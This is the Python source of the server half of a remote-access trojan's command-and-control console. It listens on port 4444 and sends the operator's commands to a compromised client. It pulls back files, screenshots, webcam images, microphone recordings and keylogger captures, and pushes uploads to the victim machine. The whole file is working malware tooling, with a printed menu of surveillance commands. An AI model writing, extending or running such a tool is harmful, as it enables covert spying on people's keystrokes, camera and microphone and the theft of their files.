import socket
import base64
import time
import struct
#create socket for client connection(n9drou ndirou multiple clients !)
def recvall(sock, size):
    data = b""
    while len(data) < size:
        packet = sock.recv(size - len(data))
        if not packet:
            return None
        data += packet
    return data

def send_file(sock, path):
    with open(path, "rb") as f:
        data = f.read()

    size = len(data)

    sock.sendall(struct.pack("!Q", size))
    sock.sendall(data)


def handle_client(client_socket):
	while True:
		try:
			command = input("C2> Enter a Command: ")
			if command.lower() == 'exit':
				break
			if command.startswith('upload '):
				local_path = command.split(' ')[1]
				client_socket.send(command.encode())
				send_file(client_socket,local_path)
				print(client_socket.recv(1024).decode())
				continue

			client_socket.send(command.encode())
			
			
			
			if  command.startswith(('download', 'webcam', 'screenshot','getmicrecord', 'getkeylogger')):
				try:
					size = struct.unpack("!Q", recvall(client_socket, 8))[0]
					encoded_data = recvall(client_socket, size)
				except Exception :
					print("Error: Incorrect Using")
					continue
				if command == 'screenshot':
					filename = f"screenshot{int(time.time())}.png"
				elif command == 'webcam':
					filename = f"webcam{int(time.time())}.png"
				elif command == 'getkeylogger':
					filename = f"keylogg{int(time.time())}.txt"
				elif command == 'getmicrecord':
					filename = f"microphone{int(time.time())}.wav"
				else:
					filename = command[9:]
				try:
					with open(filename, 'wb') as f:
						f.write(encoded_data)
					print(f"File {filename} downloaded successfully.")
					continue
				except Exception as e:
					print(f"[-] Failed to save file: {e}")
					continue
			else : 
				output = client_socket.recv(1024).decode()
				print(output)
			#keylogg wela ymchi !
				
		except Exception as e:
			print(f"An error occurred: {e}")
			break




def start_server():
	serverIP = "0.0.0.0"
	serverPort = 4444

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((serverIP, serverPort))
	s.listen(5)
	print(f"[*] Listening on {serverIP}:{serverPort}")

	while True:
		conn, addr = s.accept()
		print(f"[*] Connection established from {addr[0]}:{addr[1]}")
		print("[*] Waiting for next connection...")
		print("--------------------------------------------------")
		print("C2 Server is Running...")
		print("enter any command to send to the client")
		print("type 'upload <path on server> <path on client>' to upload file to client machine")
		print("type 'download <path>' to download file from client machine")
		print("type 'screenshot' to capture screenshot from client machine")
		print("type 'webcam' to capture webcam image from client machine")
		print("type 'keylogger' to start keylogger on client machine")
		print("type 'getkeylogger' to get keystrokes logged from client machine")
		print("type 'mic' to start recording audio from client machine")
		print("type 'getmicrecord' to get audio recorded from client machine")
		print("type 'exit' to terminate the connection")

		#client_handler = threading.Thread(target=handle_client, args=(conn,))
		#client_handler.start()
		handle_client(conn)


if __name__ == "__main__":
	start_server()
